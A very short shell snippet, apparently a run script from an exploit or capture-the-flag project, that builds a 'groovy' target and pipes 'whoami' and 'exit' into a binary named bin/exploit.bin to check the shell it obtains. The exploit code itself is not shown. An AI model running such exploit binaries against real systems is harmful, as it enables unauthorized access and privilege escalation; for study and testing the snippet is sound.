make groovy

bin/exploit.bin << EOD

whoami

exit

EOD
